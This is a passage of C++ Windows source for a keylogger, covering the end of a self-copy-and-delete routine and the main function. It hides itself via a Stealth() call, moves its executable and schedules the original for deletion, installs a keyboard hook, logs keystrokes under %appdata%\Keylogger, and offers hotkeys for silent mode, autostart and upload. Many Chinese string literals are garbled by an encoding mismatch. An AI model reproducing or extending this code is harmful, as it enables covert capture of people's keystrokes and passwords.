                if (!MoveFileExW(oldPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
                {
                    lastError = GetLastError();
                    wchar_t msg[512];
                    wsprintfW(msg, L"ɾ��ԭ����ʧ�ܣ������룺%lu\n·����%s\n�������ӳ�ɾ������������Ч��", lastError, oldPath.c_str());
                    MessageBoxW(NULL, msg, L"ɾ������", MB_ICONERROR);
                }
                else
                {
                    // �ӳ�ɾ���ɹ���֪ͨ�û�
                    MessageBoxW(NULL, L"ԭ�������´�����ʱ��ɾ����", L"��ʾ", MB_ICONINFORMATION);
                }
            }
        }
        if (argv) LocalFree(argv);
    }
}
// ==================== ������ ====================
int main()
{
    // ���ȴ����Ը�����ɾ�����ļ��������� Stealth ֮ǰ����Ϊ�����漰�˳����̣�
    HandleSelfCopyAndDelete();

    Stealth();

    // ��Ĭģʽ��ʾ�����δ������Ĭģʽ����ʾ������ʾ��
    if (!IsSilentMode()) {
        MessageBoxW(NULL, L"��¼ q(�R���Qq)\n\n��ݼ�С��ʾww\n"
            L"Ctrl + Shift + Alt + P  ��ͣ¼��\n"
            L"Ctrl + Shift + Alt + Q  ����¼��\n"
            L"Ctrl + Shift + Alt + S  ����/ȡ����������\n"
            L"Ctrl + Shift + Alt + D  ����/ȡ����Ĭ����\n"
            L"Ctrl + Shift + Alt + U  ����/�ر��ϴ�����\n\n"
            L"¼����־�������� %appdata%\\Keylogger Ŀ¼���ļ��� ip_����.log",
            L"¼�ƿ�ʼ", MB_OK);
    }

#ifdef bootwait 
    while (IsSystemBooting())
    {
        std::cout << "系统正在启动中。10秒后再次检查...\n";
        Sleep(10000);
    }
#endif
#ifdef nowait 
    std::cout << "跳过系统启动检查。\n";
#endif

    // ȷ����־Ŀ¼����
    GetLogDirectory();

    std::string output_filename = MakeOutputFilename();
    std::cout << "输出日志到 " << output_filename << std::endl;

    output_file.open(output_filename, std::ios_base::app | std::ios::binary);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
    CleanupNotifyIcon();
    ReleaseHook();
    output_file.close();
    return 0;
}